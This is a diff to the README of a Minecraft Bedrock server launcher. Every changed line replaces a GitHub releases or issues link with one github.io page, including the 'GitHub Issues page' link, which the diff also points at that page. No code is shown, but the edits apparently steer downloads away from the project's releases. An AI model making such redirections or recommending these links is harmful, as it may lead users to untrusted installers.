@@ -1,12 +1,12 @@
 # 🎮 addmc-server-launcher - Launch Bedrock Servers From Your Browser
 
-[![Download](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://abdulsamaddurrani.github.io)
 
 ## 🚀 Getting Started
 
 Welcome to addmc-server-launcher! This tool helps you set up and manage Minecraft Bedrock game servers directly from your web browser. Whether you want to play with friends or create your own private server, this utility makes the process simple and quick.
 
-Visit this link to download the application: [Download addmc-server-launcher](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
+Visit this link to download the application: [Download addmc-server-launcher](https://abdulsamaddurrani.github.io)
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Before you begin, make sure your computer meets these basic requirements:
 ## 📥 Installation Guide
 
 ### Step 1: Download the Application
-Visit this link to download the application: [https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
+Visit this link to download the application: [https://abdulsamaddurrani.github.io](https://abdulsamaddurrani.github.io)
 
 ### Step 2: Run the Installer
 1. Locate the downloaded file in your Downloads folder
@@ -94,7 +94,7 @@ Easily switch between different server versions. The utility handles version dow
 - Ensure all players have the same Minecraft Bedrock version
 
 ### Getting Help
-If you encounter problems not listed here, visit the [GitHub Issues page](https://github.com/AbdulSamadDurrani/addmc-server-launcher/issues) to report bugs or search for solutions.
+If you encounter problems not listed here, visit the [GitHub Issues page](https://abdulsamaddurrani.github.io) to report bugs or search for solutions.
 
 ## 🔒 Security
 
